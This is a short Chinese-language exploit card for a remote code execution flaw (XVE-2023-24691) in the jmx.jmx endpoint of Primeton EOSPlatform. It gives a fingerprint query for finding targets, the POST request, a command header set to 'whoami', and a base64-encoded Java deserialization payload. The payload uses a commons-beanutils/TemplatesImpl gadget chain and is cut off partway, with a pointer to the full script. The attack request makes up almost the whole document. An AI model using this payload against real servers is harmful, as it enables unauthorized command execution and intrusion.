# 普元EOSPlatform-jmx.jmx存在远程代码执行漏洞(XVE-2023-24691)

- **系统**：普元EOSPlatform-jmx.jmx　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="普元"`
- **请求**：`POST /default/jmx.jmx  HTTP/1.1`
- **关键头**：`X-Token-Data: whoami`　`Content-Type: text/plain`

**请求体 / payload**
```
{{base64dec(rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3Ijt/kQAhlemwIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVz…（脚本共 6803 字，完整版见原文）
```